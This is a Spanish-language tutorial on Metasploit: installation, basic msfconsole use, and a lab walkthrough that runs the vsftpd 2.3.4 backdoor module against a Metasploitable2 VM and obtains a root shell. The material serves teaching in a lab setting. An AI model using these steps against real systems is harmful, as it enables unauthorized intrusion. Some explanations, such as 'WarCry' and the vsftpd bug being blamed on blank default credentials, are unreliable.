# Frameworks de Ciberseguridad

Antes de meternos al tema, algunos conceptos deben conocerse para garantizar una mejor comprensión.

## Vulnerabilidad

Fallo en la seguridad de un sistema informático que puede ser utilizado con fines no propios de la creación, como fines económicos, filtración de datos que son usados internamente, etc. Pueden ser de software, hardware o configuración, algunas son explotadas sin necesidad de interacción del usuario.

## Exploit

Software que se aprovecha de una vulnerabilidad, obteniendo acceso, permisos y privilegios para tener el control del host - víctima. Ejemplo son _exploits de día cero_, que aprovechan vulnerabilidades desconocidas para los desarrolladores de software.

## Payload

Parte específica de un Exploit para ejecutar una función en pro del aprovechamiento de la vulnerabilidad. Es el código que se ejecuta despúes de tener acceso al host objetivo..

## Qué es un Framework de Ciberseguridad

Un _framework_ en software es el conjunto de lenguajes, métodos y herramientas para agilizar el desarrollo de aplicaciones. En Ciberseguridad, es un conjunto de herramientas y métodos para realizar:

- Pruebas de ataque y defensa de sistemas informáticos.
- Gestión de riesgos.
- Cumplimiento normativo.
- Protección de datos.

## Metasploit

El framework de ciberseguridad que vamos a ver es _Metasploit_ de _Rapid7_, el creador del host que instalamos en una MV en las lecciones pasadas (_Metasploitable2_).

Es un framework _open source_ y también tiene una licencia de pago (_Metasploit PRO_).

### Instalación

1. Actualicemos nuestros repositorios y paquetes de nuestro Kali Linux:

```sh
$> apt update && apt dist-upgrade -y && apt autoremove
```

> Nota: Es 100% recomendado que hagas este paso antes de instalar cualquier paquete.

2. Verifica que tu Kali Linux tenga _postgresql_, con el comando _service_. _Metasploit_ usa **PostgreSQL** como base de datos para almacenar información sobre exploits, sesiones y hosts escaneados:

```sh
$> service postgresql status
○ postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/usr/lib/systemd/system/postgresql.service; disabled; preset: disabled)
     Active: inactive (dead)
```

Si hay una salida similar con el texto _postgresql.service_, significa que sí lo tiene, pero como indica el subcomando status, este servicio está _deshabilitado_.

> Nota: Si no tienes _postgresql_, instálalo con _apt install postgresql_

3. Ahora, verifica si el comando _msfdb_ para trabajar con _Metasploit_ está en tu Kali Linux:

```sh
$> msfdb
Manage the metasploit framework database

You can use an specific port number for the
PostgreSQL connection setting the PGPORT variable
in the current shell.

Example: PGPORT=5433 msfdb init

  msfdb init     # start and initialize the database
  msfdb reinit   # delete and reinitialize the database
  msfdb delete   # delete database and stop using it
  msfdb start    # start the database
  msfdb stop     # stop the database
  msfdb status   # check service status
  msfdb run      # start the database and run msfconsole
```

Si la salida es la que se muestra arriba, ya tienes todo listo.

> Nota: Kali Linux tiene preinstalado _Metasploit_. Si por alguna razón no lo tienes instalado, visita **https://docs.rapid7.com/metasploit/installing-the-metasploit-framework/** para una guía de instalación, ya que tiene varios paquetes que son prerrequisitos antes de instalar las librería propia del framework.

### Uso básico

1. Iniciamos la base de datos de _Metasploit_:

```sh
$> msfdb init
```

En la salida te aparecerán mensaje relativos a la preparación de la base de datos. 

2. Verificamos el status de _Metasploit_:

```sh
$> msfdb status
```

Te aparecerá una salida similar al comando _service postgresql status_, indicando que el servicio de la base de datos de Postgres está activo.

3. Ahora tenemos todo listo para usar _Metasploit_:

```sh
$> msfconsole
```

Te aparecerá una salida que indica un prompt de comando de _Metasploit_ y el conteo de herramientas listas para operar (además de un bonito arte ASCII).

> Nota: Puedes usar los comandos de la terminal en _msfconsole_, más no todos, pero no hay problema con los comandos básicos como _ls, ifconfig, nmap, clear_, entre otros. Para una lista de opciones permitidas, usa en el prompt de _msfconsole_ el comando _help_.

4. _Metaspolit_ tiene herramientas para vulnerabilidades específicas, llamados _módulos_, que puedes ser _exploits, auxiliaries, posts, etcétera_, y lo podemos usar con el comando _search_, ejemplo con el conocido Ransomware _WarCry_ que es identificado con el código _ms17-010_:

```sh
msf6 > search ms17-010
```

> Nota: Ha cambiado el prompt con _msfconsole_: _msf#_.

Los resultados de este comando es un listado de **módulos**, y en la columna _Rank_ son calificados de acuerdo al número de incidencias exitosas. Por ejemplo, el módulo **27** llamado **exploit\windows\smb\smb_double_pulsar_rce** tiene una calificación de _great_ (grandioso para trabajar con esta vulnerabilidad).

5. Para usar un módulo, puedes usar tanto el valor de la columna **#** o **Name** con el comando _use_:

```sh
msf6 > use 27
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(exploit/windows/smb/smb_double_pulsar_rce) > 
```

```sh
msf6 > use exploit/windows/smb/smb_double_pulsar_rce
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(exploit/windows/smb/smb_double_pulsar_rce) > 
```

Ya estás listo para usar tu módulo seleccionado, y el prompt lo indica.

6. Puedes mostrar tanto la información como las opciones del módulo:

```sh
msf6 exploit(exploit/windows/smb/smb_double_pulsar_rce) > show info
msf6 exploit(exploit/windows/smb/smb_double_pulsar_rce) > show options
```

7. Cuando seleccionaste el módulo, también en la salida _Metasploit_ seleccionó un _payload_ predeterminado, en el ejemplo **windows/x64/meterpreter/reverse_tcp** (_Meterpreter es uno de los payloads más usados porque permite control remoto avanzado del sistema comprometido_). Para usar otro _payload_, usa _set payload_, y para mostrar los payloads disponibles, despúes de escribir _**set payload **_ pulsa la tecla _Tab_:

```sh
msf6 exploit(exploit/windows/smb/smb_double_pulsar_rce) > set payload 
...
```

Este comando se usa si _NO FUNCIONA EXITOSAMENTE UN PAYLOAD_, así que tienes a tu disposición un montón de payloads por módulos.

> Nota: Cuando se escribe un comando y tecleas _Tab_, la terminal de los SOs basados en Linux te _autocompleta_ el comando o parte de él, cosa no mostrada en la terminal de Windows _cmd_, lo cual es el tip #1 de productividad usando la terminal.

8. Para salir de un módulo, ejecutar _back_:

```sh
msf6 exploit(exploit/windows/smb/smb_double_pulsar_rce) > back
msf6 > 
```

## Atacando a _Metasploitable2_ con _Metasploit_

Vamos a 

1. Iniciamos tanto la bd de datos y la consola de _Metasploit_ (en caso de que hayamos cerrado _Metasploit_), y escaneamos el puerto de FTP del host objetivo:

```sh
$> msfdb init
$> msfconsole
msf6 > nmap 10.0.2.5 -p 21 -sC -sV
[*] exec: nmap 10.0.2.5 -p 21 -sC -sV

Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 16:38 EDT
Nmap scan report for 10.0.2.5
Host is up (0.00090s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.0.2.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
MAC Address: 08:00:27:DE:69:12 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.57 seconds
```

2. Verifica el software/servicio y su versión: **vsftpd 2.3.4**. En la siguiente línea, dice _Anonymous FTP login allowed (FTP code 230)_, significando que **las credenciales del login del servidor FTP están predeterminadas en blanco**, por lo que _es una vulnerabilidad_. Ahora buscamos con el comando _search_ el software y su versión para ver si _Metasploit_ tiene un exploit para aprovecharmos de esa vulnerabilidad:

```sh
msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
```

En versiones anteriores de _Metasploit_ salía 4 o 5 herramientas con esa búsqueda, pero con el paso del tiempo sólo obtenemos un exploit resultado de.

3. Ahora que usamos _search_ ponemos usar los resultados por su **#** con el comando _use_. Mostramos la información y las opciones del exploit para saber cómo usarlo:

```sh
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/interact
msf6 (exploit/unix/ftp/vsftpd_234_backdoor) > show info
msf6 (exploit/unix/ftp/vsftpd_234_backdoor) > show options
```

> Nota: Es este exploit, no hay un payload específico configurado por defecto, cmd/unix/interact es la herramienta para la terminal.

4. Vamos a comenzar a usar el exploit, mostrando los valores de las opciones _(RHOSTS y RPORT)_, y estableciendo el valor de _RHOST = IP Host de Metasploitable2_:

```sh
msf6 (exploit/unix/ftp/vsftpd_234_backdoor) > options
...
   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met
                                      asploit.html
   RPORT   21               yes       The target port (TCP)
...
msf6 (exploit/unix/ftp/vsftpd_234_backdoor) > set rhosts 10.0.2.5
rhosts => 10.0.2.5
msf6 (exploit/unix/ftp/vsftpd_234_backdoor) > options
...
   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.0.2.5         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met
                                      asploit.html
   RPORT   21               yes       The target port (TCP)
...
```

El parámetro RPORT ya tiene el valor 21, así que no tenemos que usar _set rport 21_ para ello.

5. Ahora ya tenemos todo listo para ejecutar el exploit, usando el comando _exploit_ o _run_:

```sh
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 10.0.2.5:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.0.2.5:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 10.0.2.5:21 - The port used by the backdoor bind listener is already open
[+] 10.0.2.5:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (10.0.2.15:37877 -> 10.0.2.5:6200) at 2025-06-10 17:11:59 -0400


```

> Nota: Intenté con _run_, más el exploit no abrió una sesión de terminal (shell). Cuando ejecute el exploit con el otro comando (_exploit_), ya se creó la sesión.

Como vimos en los conceptos del principio, un _exploit es un software que se aprovecha de una vulnerabilidad, obteniendo acceso, permisos y privilegios para tener el control del host - víctima_, y en la salida:

- Los logs (mensajes) son del servidor FTP de Metasploitable2, _no de tu Kali Linux_.
- El exploit se aprovecha de la vulnerabilidad, entrando por las credenciales por defecto del servidor FTP.
- También el exploit se cambió al usuario _root_.
- El exploit "finaliza" con un prompt listo para operar Metasploitable2 como el usuario _root_ (a pesar de que no ponga un prompt). Puedes usar los comandos aprendidos como _ls, id, pwd, whoami, ifconfig_. Tenemos el control del host objetivo.

Puedes ejecutar el comando _exit_ para cerrar la sesión creada por el exploit. Tú solamente estableciste el host al exploit, y no estuviste ejecutando los comandos para conectar al servidor FTP de vsftpd 2.3.4, escribir las credenciales y cambiar al usuario root. Estas son algunas de las ventajas de los exploit en lugar de hacerlo todo manual.

Cabe mencionar que se debe de hacer un **uso responsable de Metasploit**, recordando que debe emplearse solo en entornos de prueba o con autorización.
